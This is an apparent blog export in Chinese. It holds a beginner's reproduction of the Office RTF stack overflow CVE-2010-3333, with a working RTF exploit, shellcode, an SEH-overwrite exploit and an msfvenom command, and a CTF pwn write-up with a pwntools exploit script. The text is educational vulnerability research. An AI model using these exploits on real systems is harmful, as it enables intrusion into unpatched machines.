https://0x48.pw/2018/03/30/0x42/]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2010-3333栈溢出漏洞复现新手向]]></title>
    <url>%2F2019%2F01%2F31%2FCVE-2010-3333%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%96%B0%E6%89%8B%E5%90%91%2F</url>
    <content type="text"><![CDATA[写在前面之前搞的二进制一直都是Linux下的，这是第一次复现Windows漏洞。整体思路是参考《漏洞战争》这本书。虽然看的blog或者书籍都说了是非常适合小白学习的教程，但只要自己亲自开始弄，无论别人的教程写的多么细致，调的过程中总会遇见更加新手的问题。所以还是要动手调，动手查资料，自己解决问题。写这篇blog的目的，一是补充一些我在看教程时候遇到的新手问题，方便其他小白；二是希望锻炼自己独立解决问题的能力。 在《漏洞战争》这本书里，写到CVE-2010-3333漏洞适用于Office2003和Office2007等多个版本，但是触发的原理不大相同，于是我就分别探究了两个版本的PoC。接下来写的顺序也是我自己的学习过程： 123452003版的PoC寻找漏洞点，根据PoC修改成EXP了解SEH，通过一个例子利用SEH2007版的PoC寻找漏洞点，根据PoC修改成EXP Office 2003的漏洞复现rtf文件格式rtf形式上类似于xml，通过控制字编辑属性。从msf生成的msf.rtf来看，各个字段的含义如下：（来自漏洞战争） \rtf1：rtf版本 \shp：绘画对象 \*\shpinst：图片引用 \sp：绘画对象属性定义 \sn pFragments：定义属性名称，pFragments段是图形的附加部分，属于数组结构。允许图形包含多个路径和分段，该属性列出图形各个碎片 \sv：定义属性值 更多的rtf文件知识参考https://zhuanlan.zhihu.com/p/31345299 定位漏洞主要采用回溯函数调用关系来对漏洞定位。PoC为msf.rtf，是参照《漏洞战争》利用metasploit生成的。 1.打开word，以附加进程的方式使用windbg进行调试。这里pid是WINWORD.EXE对应的pid，-g参数是忽略掉初始断点，如果不加这一参数会停留在int 3处。 1windbg.exe -g -p pid 2.打开msf.rtf文件，windbg停在mso.dll中的30e9eb88处： 将这条指令简化成mov [edi]，[esi]。停在这里说明edi或者esi中的某个值不是合理地址，或者权限不对。用!address edi查看edi中地址的信息： 发现这个位置是只读权限，而mov这条指令要向其中写入内容，造成了程序崩溃。 结合IDA，查看30e9eb88所在函数是sub_30e9eb62。 3.关闭windbg，用windbg.exe -p pid再次附加到WINWORD.EXE，不加-g参数是为了方便设置断点。在30e9eb88设置断点，并用g命令让程序继续执行到断点： 打开msf.rtf，程序停在断点处，通过kv命令或者alt+6，查看函数调用栈： 当前执行的语句在第一行，即mso!Ordinal6463+0x64d，当前函数栈桢的ebp是00183d88，返回地址是30f4cdbd。这里windbg说明了“Following frames may be wrong”，信息未必完全准确，就暂且认为30f4cdbd之前调用了30e9eb88所属的sub_30e9eb62函数。由于函数在调用之前压入的返回地址是下一条指令，所以用ub命令查看30f4cdbd之前的汇编指令： 在30f4cdb8处，调用了一个函数，但这个函数并不是sub_30e9eb62。我在这里疑惑了很久，光猜是没什么用的，还是继续调才能解决问题。 4.用windbg.exe -p pid再次打开，在30f4cc5d设置断点，F10单步不步入运行。在30f4cc93处，call [eax+0x1c]显示的正是30e9eb62： 通过汇编查看调用该函数的参数： 其中第二个参数ecx为ebp-0x10，只要写入0x10+4+4个字节就能覆盖到返回地址。 F8步入到这个函数中执行，第二个参数赋值给了edi，而且在执行到30e9eb88之前，edi的值都没有发生变化。也能看到，这个函数进入的时候是push的edi，而不是ebp，可以猜想windbg是通过识别ebp来识别不同栈桢的，这也就是为什么30f4cc5d这个函数没有在kv中显示出来。 在30e9eb6f处，ecx被赋值为[eax+8]，这个值是在rtf文件中输入的acc8。 接着执行到30e9eb83，查看esi的内容： esi的内容就是在rtf文件中acc8后面的乱码。也就是说要把esi中的这些乱码复制到edi对应的地址中，复制多少呢？rep的循环次数由ecx确定，ecx是0xc8a8/4（shr ecx,2），远大于edi对应的0x10大小（ebp-0x10），由此造成栈溢出。 6.总结一下就是，30f4cdbd处调用了sub_30f4cc5d函数；sub_30f4cc5d在30f4cc93处通过call [eax+0x1c]调用了sub_30e9eb62，且第二个参数为ebp-0x10；sub_30e9eb62在30e9eb88处将esi地址中的内容复制到edi地址中，复制的大小由pFragments中的数据指定，且没有对长度进行检查，造成栈溢出，而edi就是上一个函数sub_30f4cc5d传过来的参数ebp-0x10，这个ebp是sub_30f4cc5d的ebp，因此溢出结果会影响sub_30f4cc5d函数的返回。 生成EXP前面说到覆盖到返回地址需要0x14+4字节，rtf文件里写的是十六进制，也就是两个字符是一个字节，所以在acc8之后先随意填充0x14个字节，也就是40个字符，然后写入返回地址。在《漏洞战争》里返回地址覆盖成了jmp esp的地址。另外还要注意sub_30f4cc5d函数返回时用的是ret 14h指令，即ret之后再从栈中pop 0x14个字节，那么在返回地址之后再填充40个字符之后，写入shellcode即可。 123456&#123;\rtf1&#123;&#125;&#123;\shp&#123;\*\shpinst&#123;\sp&#123;\sn pfragments&#125;&#123;\sv1;1;11111111222211111111111111111111111111111111111111111245fa7f000000000000000000000000000000000000000031d2b230648b128b520c8b521c8b42088b72208b12807e0c3375f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e4661746175f2817e084578697475e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c76879202001686661697268204e657489e1fe490b31c05150ffd7&#125;&#125;&#125;&#125;&#125; SEH知识及利用由于Office2007的利用会用到SEH的知识，因此先了解一下SEH。 关于SEHSEH是windows中的异常处理例程。SEH包含两个结构： 12next SEH 指向下一个SEHSEH handler 指向处理异常的函数 通常我们在编写程序时会用try……catch……捕捉并处理异常，执行时就会生成SEH结构，并压入到当前的函数栈桢中。windows系统有默认的异常处理函数，就是常见的弹框提示XX程序停止运行。 程序中的SEH结构以单向链表的形式组织起来，最后一个SEH结构的next SEH为0xffffffff，SEH handler 为windows的异常处理函数。 当程序发生异常时，KiUserExceptionDispatcher函数调用RtlDispatchException函数对线程的SEH链进行遍历，如果找到能够处理异常的回调函数，进行unwind操作将之前的SEH结构体从链表中拆除，并执行当前SEH的异常处理函数。如果线程的SEH不能处理这个异常，且用户曾使用SetUnhandledExceptionFilter注册过进程异常处理，则调用之；否则调用Windows默认的异常处理函数。 异常处理函数SEH handler的参数有4个 1234pExcept:指向一个结构体EXCEPTION_RECORDpFrame:指向SEH结构体pContext:指向Context结构体，记录了寄存器的状态pDispatch SEH的利用由于SEH结构都是存放在栈中，栈溢出漏洞能够对其进行利用。 先来调一个小程序seh_test.exe，来自Netfairy师傅的教程第三篇 1234567891011121314151617181920212223242526272829303132333435#include&lt;windows.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;void test(char *str)&#123; char buf[8]; strcpy(buf,str);&#125;int main()&#123; FILE *fp; int i; char str[30000]; LoadLibrary("Netfairy.dll"); if((fp=fopen("test.txt","r"))==NULL) &#123; printf("\nFile can not open!"); getchar(); exit(0); &#125; for(i=0;;i++) &#123; if(!feof(fp)) &#123; str[i]=fgetc(fp); &#125; else &#123; break; &#125; &#125; test(str); fclose(fp); getchar(); return 0; 程序中向str中读入文件内容，如果test.txt内容超过30000字节，将有机会溢出到SEH结构，在strcpy后会将test函数的返回地址覆盖，进而触发异常，执行我们构造好的SEH handler。 1.用windbg打开seh_test.exe，在main函数中设置断点，!exchain命令查看正常的SEH链。 1234560:000&gt; !exchain006fffcc: ntdll!_except_handler4+0 (77342bd0) CRT scope 0, filter: ntdll!__RtlUserThreadStart+39ce3 (7736d76c) func: ntdll!__RtlUserThreadStart+39d2a (7736d7b3)006fffe4: ntdll!FinalExceptionHandlerPad24+0 (7734f308)Invalid exception stack at ffffffff 可见正常的SEH链是从0x6fffcc开始的，可以通过栈溢出修改这里的next SEH和SEH handler。 利用的步骤是：确定填充字节数-&gt;修改handler为pop,pop,ret的地址；next SEH为jmp 6-&gt;构造shellcode 2.填充字节数 为了方便确定字节数，写了一个产生随机字符的python脚本，由此生成test.txt。脚本中先将str的30000个字符填充为a后，之后的数据用随机字符填充。 12345678def generate_random_str(randomlength=16): random_str = '' base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789' length = len(base_str) - 1 for i in range(randomlength): random_str += base_str[random.randint(0, length)] return random_strpayload =30000*'a'+generate_random_str(1000) 在test的401513设置断点并用!exchain查看SEH中内容 。 这里遇到一个坑，因为使用dev-c++编译的，它的编译器总是把char数组放在高地址，所以str溢出的话会覆盖其他变量，包括fp。为了让feof正常进行，要把fp覆盖成原本的地址。在main的4015b1设置断点，fp的地址为ebp-0x10，查看其值并修改payload： 1payload =30000*'a'+'\x60\x46\xc8\x74'+generate_random_str(1000) 查看SEH： 1230:000&gt; !exchain006fffcc: 77686c69Invalid exception stack at 74305168 即next SEH被修改为74305168，即t0Qh，由于是小端模式，实际为hQ0t。在test.txt里查找hQ0t，其偏移为30242 修改payload为： 1payload =30000*'a'+'\x60\x46\xc8\x74'+238*'b'+'\x90\x90\x90\x90'#先将SEH填为nop 在windbg里选择restart，发现这个长度不足以覆盖到SEH，根据调试情况修改payload长度，最终填充为： 1payload =30000*'a'+'\x60\x46\xc8\x74'+257*'b'+'\x90\x90\x90\x90'#先将SEH填为nop 3.修改SEH 之所以修改handler为gadget地址，是因为前面提到，异常处理函数有4个参数，其中第二个就是SEH结构体pFrame。也就是说在执行handler时，栈上有一个返回地址和4个参数，前两个pop弹出了返回地址和pExcept，ret对应的就是pFrame的地址，也就是回到了当前SEH结构体在栈中的地址。这个地址也对应于next SEH字段的地址。 在next SEH位置写入jmp 6（eb 06）指令，jmp 6是由于执行到6fffcc时，eip为下一条指令地址即6fffce，jmp 6相当于eip + 6，即eip= 6fffd4。即接下来就会去执行SEH结构体之后的shellcode。 由于大部分库都加入了safeseh的保护机制，所以需要找一个没有safeseh且有poppopret指令的二进制文件。因为执行到SEH handler时，如果handler所在的模块开了safeseh，这个机制会检查handler的地址是否属于该dll的SEH映射表（gadget的地址肯定不在表里），如果不在就会终止异常。safeSEH细节，参考safeseh。这里用的是师傅自己写的dll。 考虑到shellcode长度较大，把shellcode写在前面30000字节中，然后在6fffd4中用jmp跳转到shellcode处。这里需要注意的是jmp分为short near和far，eb 06就属于short短跳转；如果超过两个字节但在同一个段里，用e9 near近跳转；如果已经不在一个段里，就用ea far远跳转。这里要用e9，而且jmp后面的参数也是以小端形式写入的。4.生成shellcode由于本程序是32位的，所以shellcode也要用x86的payload，metasploit生成shellcode： 1msfvenom -a x86 --platform windows -p windows/messagebox TEXT="hello world!" -b "\x00\x1a" -f python 5.最终的exp 12345678910111213141516171819202122232425262728293031filename="test.txt"myfile=open(filename,'w') buf = ""buf += "\xba\xbd\xef\xb1\xd3\xda\xd9\xd9\x74\x24\xf4\x5e\x33"buf += "\xc9\xb1\x43\x31\x56\x15\x83\xee\xfc\x03\x56\x11\xe2"buf += "\x48\x36\x5a\x48\x6b\xbd\xb9\x9b\xba\xec\x70\x14\x8d"buf += "\xd9\x11\x50\x9c\xe9\x52\x10\x52\x81\x13\xc1\xe1\xd3"buf += "\xd3\x72\x8b\xfb\x68\xb2\x4b\xb3\x76\xce\x58\x12\x86"buf += "\xe1\x61\x44\xe8\x8a\xf1\xa3\xcd\x07\x4c\x90\x86\x4c"buf += "\x66\x90\x99\x86\xfd\x2a\x82\xdd\x5b\x8b\xb3\x0a\xb8"buf += "\xff\xfa\x47\x0a\x8b\xfc\xb9\x43\x74\xcf\x85\x5f\x26"buf += "\xb4\xc6\xeb\x30\x74\x09\x1e\x3e\xb1\x7d\xd4\x7b\x41"buf += "\xa6\x3c\x09\x58\x2d\x66\xd5\x9b\xd9\xf0\x9e\x90\x56"buf += "\x77\xfa\xb4\x69\x6c\x70\xc0\xe2\x73\x6f\x40\xb0\x57"buf += "\x73\x32\xfa\x25\x83\x9d\x28\xc0\x71\x54\x12\xba\xf7"buf += "\x29\x9d\xd6\x5a\x5e\x3e\xd9\xa4\x61\xc8\x60\x5f\x25"buf += "\xb5\xb2\xbd\x2a\xcd\x5e\x66\x9f\x39\xd0\x99\xe0\x45"buf += "\x65\x20\x17\xd2\x19\xc7\x07\x63\x89\x24\x7a\x4d\x2d"buf += "\x23\x0f\xe2\xc8\xc1\xdf\xdf\x9a\x7a\x04\xea\x13\x64"buf += "\x12\x15\x76\x6d\x12\x2b\x28\xd6\x8c\x0e\x85\x94\x4a"buf += "\x52\x31\xb7\xbc\x34\xc6\xc8\xc2\xa3\x57\x4f\x65\x14"buf += "\xcf\xce\xf2\x31\x4d\x79\xb0\xdc\x22\x0a\x7b\xc4\x4c"buf += "\xb0\x5f\xf0\xc5\xaa\xc8\x5c\xf5\x0c\x29\x35\x87\x20"buf += "\x4d\xe4\x0f\xd6\xad\x91\xa0\x40\xc6\x38\x52\xfd\x27"buf += "\x0a\x22\xb1\x63\x80\xbb\xab\x5d\x4a\xe9\x78\xcf\x38"buf += "\xf2\xaf\xde\x7c\x5c\xaf\x74\x75"filedata="A"*29600+buffiledata = filedata.ljust(30000,"B")filedata +='\x60\x46\x8a\x74'+"c"*257+"\xeb\x06\x90\x90" + '\x44\x13\x02\x50'+'\xe9\xff\xfc\xff\xff'myfile.write(filedata) myfile.close() Office 2007的漏洞复现PoC仍然使用2003的PoC。 定位漏洞1.打开word，用windbg.exe -g -p pid附加到winword.exe2.打开msf.rtf(同2003)，停在： 123456789(240.a54): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=3c524228 ebx=00000000 ecx=0017ff5c edx=00000000 esi=034f0600 edi=00180118eip=32cf3814 esp=0017ff10 ebp=0017ff10 iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program Files (x86)\Common Files\Microsoft Shared\office12\mso.dll - mso!Ordinal7356+0x1315:32cf3814 8b4804 mov ecx,dword ptr [eax+4] ds:002b:3c52422c=???????? 在32cf3814的指令中，eax+4不是一个合法地址。通过汇编窗口向上回溯eax的来源： 123456789101132cf37f8 0000 add byte ptr [eax],al32cf37fa 34c2 xor al,0C2h32cf37fc 0000 add byte ptr [eax],al32cf37fe 3442 xor al,42h32cf3800 b301 mov bl,132cf3802 e97cffffff jmp mso!Ordinal7356+0x1284 (32cf3783)32cf3807 55 push ebp32cf3808 8bec mov ebp,esp32cf380a 8b450c mov eax,dword ptr [ebp+0Ch]32cf380d 8d04c52038cf32 lea eax,mso!Ordinal7356+0x1321 (32cf3820)[eax*8]32cf3814 8b4804 mov ecx,dword ptr [eax+4] ds:002b:3c52422c=???????? 上一条指令里对eax进行了赋值：eax = *(0x32cf3820+eax*8)，其中eax=[ebp+0xc]，也就是调用当前函数时传入的第二个参数arg2。根据calls窗口，找到调用当前函数（简称为Ordinal7356)的位置： 可见在Ordinal2605中调用了Ordianal7356，压入的第二个参数为[ebp+8]，即这个值是上一个函数传入的第一个参数，接着通过calls回溯： 在Ordinal2605+0x33db调用了Ordial2605+0x323c，arg1为ebp-0x10，是一个局部变量。为了回溯这个变量，使用IDA查看： 在调用[eax+0x1c]时，ebp-0x10作为arg2，这里有可能对它进行修改。 3.重新进入调试，在32e595a1下断点并进入： 由于windbg需要符号表(pdb)才能对函数名进行解析，我的windbg比较原始，就用IDA来辅助查看： 通过memcpy向dst复制，复制的size就是传入的第二个参数，由于没有检查size的大小，造成了栈溢出。运行到memcpy之前查看dst的地址为0x17ff54。通过!exchain查看SEH链： 1230:000&gt; !exchain0018698: 37714836Invalid exception stack at 71482571 说明next SEH 0x181698处被覆盖为了0x71483571，由此可以确定溢出点和SEH之间的距离为0x1744. 4.总结一下就是，在327c00c函数中，memcpy没有对size进行检查。可以利用这个漏洞，覆盖掉这个函数的返回地址为无效地址，从而触发SEH异常处理，进而执行我们事先准备好的shellcode。 生成EXP修改msf.rtf，把next SEH处修改为jmp 6；SEH handler修改为pop pop retn的gadget。 其中gadget的查找方式是在OD中，通过SAFESEH插件查看哪些模块没有开启SEH保护，即/safeseh off。在这样的库中通过ctrl+s查找gadget。这里用的是ntdll.dll中的0x78e5131d shellcode则是利用seh_test中的shellcode，用encode(‘hex’)转换为普通字符。 总结这次复现是通过PoC反向推漏洞点，再修改PoC为EXP。对于这种大型软件的漏洞，很难做到搞懂软件的代码，而且Office并不开源，读IDA中的反编译也有一定难度。这次我只是做了简单的复现，探究的也很浅。希望后续的漏洞复现能够继续深入，在掌握软件的基本逻辑后再探究漏洞的复现，效果会更好些。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018鹏城杯pwn]]></title>
    <url>%2F2019%2F01%2F04%2F2018%E9%B9%8F%E5%9F%8E%E6%9D%AFpwn%2F</url>
    <content type="text"><![CDATA[shotshot基本逻辑123451. create weapon2. show weapon3. drop weapon4. shot5. exit create创建一个weapon，weapon的长度和名字都由用户输入。 12345678910111213141516171819202122232425__int64 create()&#123; int v1; // [sp+4h] [bp-Ch]@2 __int64 v2; // [sp+8h] [bp-8h]@1 v2 = *MK_FP(__FS__, 40LL); while ( 1 ) &#123; puts("Input the length of your weapon's name:"); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt;= 0x200000 ) break; puts("too long!"); &#125; weapon = (char *)malloc(v1); if ( !weapon ) &#123; puts("malloc error!"); exit(-1); &#125; puts("Input the name:"); to_read(weapon, v1); puts("Success!"); return *MK_FP(__FS__, 40LL) ^ v2;&#125; show输出weapon内容，存在格式化字符串漏洞 12345678910int show()&#123; int result; // eax@2 if ( weapon ) result = printf(weapon); // format string else result = puts("No weapon!"); return result;&#125; drop释放weapon并置零。 123456789101112void drop()&#123; if ( weapon ) &#123; puts("I can't believe it!"); free(weapon); weapon = 0LL; &#125; else &#123; puts("No weapon!"); &#125; shot函数中用到的start，是在init_addr中mmap(8)（简写）后返回的一个地址，由于mmap必须以页为单位进行映射，即使mmap的参数为8，也会映射到一页上。这里start是一个指针，指向一块类似于虚表的位置，结构如下： 1234567struct sshot&#123; int id; //4 bytes int num;//4 bytes int (*init)(int *num,int value); //pointer 8 bytes int (*get_id)(int *id); //pointer 8 bytes int (*dead)(struct shot *s);//pointer 8 bytes&#125;shot; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859__int64 shot()&#123; int *v0; // rsi@2 struct sshot **v1; // rbx@3 int v3; // [sp+4h] [bp-1Ch]@2 __int64 v4; // [sp+8h] [bp-18h]@1 v4 = *MK_FP(__FS__, 40LL); if ( weapon ) &#123; puts_shot(); v0 = &amp;v3; __isoc99_scanf("%d", &amp;v3); if ( !*start ) &#123; v1 = start; // mmap(8) v0 = (int *)40; *v1 = (struct sshot *)mmap(0LL, 0x28uLL, 3, 34, 0, 0LL); if ( *start == -1 ) &#123; puts("mmap error!"); exit(-1); &#125; &#125; (*start)-&gt;init = (__int64)init; (*start)-&gt;get_id = (__int64)get_id; (*start)-&gt;dead = (__int64)dead; (*start)-&gt;congratulation = (__int64)congratulations; if ( v3 == 1 ) &#123; v0 = (int *)4; ((void (__fastcall *)(int *, signed __int64))(*start)-&gt;init)(&amp;(*start)-&gt;num, 4LL); ((void (__fastcall *)(struct sshot *))(*start)-&gt;get_id)(*start); &#125; if ( v3 == 2 ) &#123; v0 = (int *)6; ((void (__fastcall *)(int *, signed __int64))(*start)-&gt;init)(&amp;(*start)-&gt;num, 6LL); ((void (__fastcall *)(struct sshot *))(*start)-&gt;get_id)(*start); &#125; if ( v3 == 3 ) &#123; v0 = (int *)8; ((void (__fastcall *)(_QWORD, signed __int64))(*start)-&gt;init)(&amp;(*start)-&gt;num, 8LL); ((void (__fastcall *)(_QWORD))(*start)-&gt;get_id)(*start); &#125; --(*start)-&gt;num; if ( ((int (__fastcall *)(struct sshot *, int *))(*start)-&gt;dead)(*start, v0) ) &#123; ((void (*)(void))(*start)-&gt;congratulation)(); *start = 0LL; &#125; &#125; else &#123; puts("No weapon!"); &#125; return *MK_FP(__FS__, 40LL) ^ v4;&#125; dead函数如下：123456789101112131415161718192021222324252627signed __int64 __fastcall dead(struct sshot *a1)&#123; signed __int64 result; // rax@2 __int64 v2; // rcx@4 int v3; // [sp+1Ch] [bp-14h]@2 int num; // [sp+20h] [bp-10h]@1 unsigned int id; // [sp+24h] [bp-Ch]@1 __int64 v6; // [sp+28h] [bp-8h]@1 v6 = *MK_FP(__FS__, 40LL); num = a1-&gt;num; id = a1-&gt;id; if ( num &gt; 0 ) &#123; result = 0LL; &#125; else &#123; printf("%d is dead...\n", id); puts("Give me your luckynum:"); __isoc99_scanf("%d", &amp;v3); *(_BYTE *)((signed int)id + a1) = v3; result = 1LL; &#125; v2 = *MK_FP(__FS__, 40LL) ^ v6; return result;&#125; 漏洞及利用由于是线下赛，遇到格式化字符串大家肯定都会第一时间patch，所以没有从格式化字符串漏洞入手。 在shot函数里调用了mmap，通过动态调试，能够观察到mmap的映射是从高地址向低地址进行的，在init_addr中为start映射的地址比后续mmap的都要高。start中的地址： 12pwndbg&gt; x/8gx 0x6020d00x6020d0 &lt;start&gt;: 0x00007ffff7ff6000 调用shot函数时，mmap(0x28)返回的地址，即rax为0x7ffff7ff5000： 1234567*RAX 0x7ffff7ff5000 ◂— 0x0 RBX 0x7ffff7ff6000 ◂— 0x0……─────────────────────[ DISASM ]─────────────────────── 0x400bc9 &lt;shot+126&gt; call mmap@plt &lt;0x400760&gt; ► 0x400bce &lt;shot+131&gt; mov qword ptr [rbx], rax 另外，在dead函数中，存在任意写的漏洞。id和v3均由用户操作，可以向任意内存进行写操作。 1*(_BYTE *)((signed int)id + a1) = v3; 结合这两点实现漏洞利用。 1.每次mmap的地址偏移都是0x1000，且由高地址向低地址增长； 2.内存任意写 利用的方式是，通过任意写向mmap区域中的某一个高地址写入one_gadget的地址，一次写入一个字节，分6次写入；再修改*start里面的值的倒数第二位，使修改后的值，congratulation函数位置对应到我们写入one_gadget的地址即可。这个倒数第二位的值可以根据libc与mmap之间的偏移进行计算，有少许的概率会失败。 one_gadget地址需要通过泄露libc来实现，在welcome输入name时，由于read不会向末尾加入\0，printf时会输出name后面的内容，通过查看此时的栈，发现其中有setvbuf+154的地址，作为libc地址的泄露。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *context.log_level='debug'timeout = 0gadget=[0x45216,0x4526a,0xf02a4,0xf1147]p = process('./shotshot')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def welcome(name): p.sendlineafter("Your name :",name,timeout)def create(name,n): p.sendlineafter("5. exit\n",'1',timeout) p.sendlineafter("Input the length of your weapon's name:\n",str(n),timeout) p.sendlineafter("Input the name:\n",name,timeout)def show(): p.sendlineafter("5. exit\n",'2',timeout)def func1(ids,luckynum): p.sendlineafter("Input the id:\n",str(ids),timeout) p.sendlineafter("Give me your luckynum:\n",str(luckynum),timeout) def shot(ids,luckynum,flag=0): p.sendlineafter("5. exit\n",'4',timeout) p.sendlineafter("3. C++\n",str(num),timeout) p.sendlineafter("Input the id:\n",str(ids),timeout) if flag: p.sendlineafter("Give me your luckynum:\n",str(luckynum),timeout)def select_shot(idx): p.recvuntil('exit') p.sendline('4') p.recvuntil('3. C++') p.sendline(str(idx))def write_one(where,value): select_shot(1) p.recvuntil('id:') p.sendline(str(where)) select_shot(0) select_shot(0) select_shot(0) p.recvuntil('luckynum:') p.sendline(str(value))#leak libc addresswelcome('a'*40)p.recvuntil("a"*40)setvbuf_addr = u64(p.recv(6).ljust(8,'\x00'))-154log.info("setvbuf address:%#x",setvbuf_addr)libc_addr = setvbuf_addr - libc.symbols['setvbuf']log.info("libc address:%#x",libc_addr)#0x5ee000 is offset of libc and mmapmaybe = ((libc_addr+0x5ee000)&gt;&gt;8)&amp;0xffif maybe &lt;0x70: print 'bad luck :('create("0gur1",6)for i in range(0,6): value = ((libc_addr+gadget[0])&gt;&gt;8*i)&amp;0xff where = 0x1000*i+0x1020+i write_one(where,value)#write the 2nd last bytewhere = 0x1000*6+0x1000+1write_one(where,maybe)p.interactive() hero基本逻辑12345678Do you want to be superhero?1. add hero2. show hero3. edit hero4. remove hero5. exit6. mathYour choice: add函数输入name和power，这两个数组均位于bss。 123456789101112131415161718int add()&#123; _BYTE *v1; // rbx signed int i; // [rsp+Ch] [rbp-14h] for ( i = 0; i &lt;= 9 &amp;&amp; name[i]; ++i ) ; if ( i == 10 ) return puts("You can't add more heros!"); name[i] = malloc(0x68uLL); // fastbin power[i] = malloc(0xF8uLL); // small bin puts("What's your hero's name:"); v1 = name[i]; v1[read(0, name[i], 0x68uLL)] = 0; // off by one puts("What's your hero's power:"); read(0, power[i], 0xF8uLL); return puts("Done!");&#125; show函数输出name和power，这里由于v1是unsigned int，不会出现数组越界的问题。 123456789101112131415161718192021unsigned __int64 show()&#123; unsigned int v1; // [rsp+Ch] [rbp-24h] char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); puts("What hero do you want to show?"); read(0, &amp;buf, 0x10uLL); v1 = atoi(&amp;buf); if ( v1 &lt;= 9 &amp;&amp; name[v1] ) &#123; printf("Hero:%s\nPower:%s\n", name[v1], power[v1]); puts("Done!"); &#125; else &#123; puts("No such hero!"); &#125; return __readfsqword(0x28u) ^ v3;&#125; edit函数将name和power都释放并重新分配。 123456789101112131415161718192021222324252627282930unsigned __int64 edit()&#123; _BYTE *v0; // rbx unsigned int v2; // [rsp+Ch] [rbp-34h] char buf; // [rsp+10h] [rbp-30h] unsigned __int64 v4; // [rsp+28h] [rbp-18h] v4 = __readfsqword(0x28u); puts("What hero do you want to edit?"); read(0, &amp;buf, 0x10uLL); v2 = atoi(&amp;buf); if ( v2 &lt;= 9 &amp;&amp; name[v2] ) &#123; free(name[v2]); name[v2] = malloc(0x68uLL); puts("What's your hero's name:"); v0 = name[v2]; v0[read(0, name[v2], 0x68uLL)] = 0; // off by one free(power[v2]); // leak bk power[v2] = malloc(0xF8uLL); puts("What's your hero's power:"); read(0, power[v2], 0xF8uLL); puts("Done!"); &#125; else &#123; puts("No such hero!"); &#125; return __readfsqword(0x28u) ^ v4;&#125; dele函数释放name和power对应的内存。 123456789101112131415161718192021222324unsigned __int64 del()&#123; unsigned int v1; // [rsp+Ch] [rbp-24h] char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); puts("What hero do you want to remove?"); read(0, &amp;buf, 0x10uLL); v1 = atoi(&amp;buf); if ( v1 &lt;= 9 &amp;&amp; name[v1] ) &#123; free(name[v1]); free(power[v1]); name[v1] = 0LL; power[v1] = 0LL; puts("Done!"); &#125; else &#123; puts("No such hero!"); &#125; return __readfsqword(0x28u) ^ v3;&#125; math函数做一些简单的运算，运算函数地址存放在funcs中。 123456789101112131415161718192021222324252627282930313233__int64 math()&#123; unsigned int v1; // [rsp+0h] [rbp-20h] unsigned int v2; // [rsp+4h] [rbp-1Ch] unsigned int v3; // [rsp+8h] [rbp-18h] unsigned int v4; // [rsp+Ch] [rbp-14h] __int64 (__fastcall *v5)(_QWORD, _QWORD); // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); puts( "What do you want to do?\n" "1. Add two numbers\n" "2. Subtract two numbers\n" "3. Multiply two numbers\n" "4. Divide two numbers"); fflush(_bss_start); read_integers((__int64)&amp;v1, (__int64)&amp;v2); printf("You chose: %d\nPlease input two numbers to do math with\n", v1); fflush(_bss_start); read_integers((__int64)&amp;v2, (__int64)&amp;v3); v5 = (__int64 (__fastcall *)(_QWORD, _QWORD))*(&amp;funcs + (signed int)(v1 - 1)); v4 = v5(v2, v3); printf("Result: %d\n", v4); fflush(_bss_start); return 0LL;&#125;__int64 __fastcall read_integers(__int64 a1, __int64 a2)&#123; fgets(buf, 256, stdin); return __isoc99_sscanf(buf, "%d %d", a1, a2);&#125; funcs： 1234.data:00000000006020A0 funcs dq offset add1 ; DATA XREF: math+81↑r.data:00000000006020A8 dq offset subtract.data:00000000006020B0 dq offset multiply.data:00000000006020B8 dq offset divide 漏洞及利用这题很明显的一点是，没有开启NX保护。再加上执行(funcs+v1)(v2,v3)函数时，并没有对v1的数值进行检查，能够将shellcode写入到bss段上并执行。patch的方法是修改elf文件的堆栈读写权限，以及限制v1的大小。 修改读写权限是和echo大佬学的。ELF文件头Elf64_Ehdr中有一个e_phoff字段，描述了program header的偏移，在IDA中通过这个值找到program header。 1234567891011121314151617typedef struct&#123; unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */&#125; Elf64_Ehdr; 123456789101112131415161718192021LOAD:0000000000400000 dword_400000 dd 464C457Fh ; DATA XREF: LOAD:00000000004000C0↓oLOAD:0000000000400000 ; File format: \x7FELFLOAD:0000000000400004 db 2 ; File class: 64-bitLOAD:0000000000400005 db 1 ; Data encoding: little-endianLOAD:0000000000400006 db 1 ; File versionLOAD:0000000000400007 db 0 ; OS/ABI: UNIX System V ABILOAD:0000000000400008 db 0 ; ABI VersionLOAD:0000000000400009 db 7 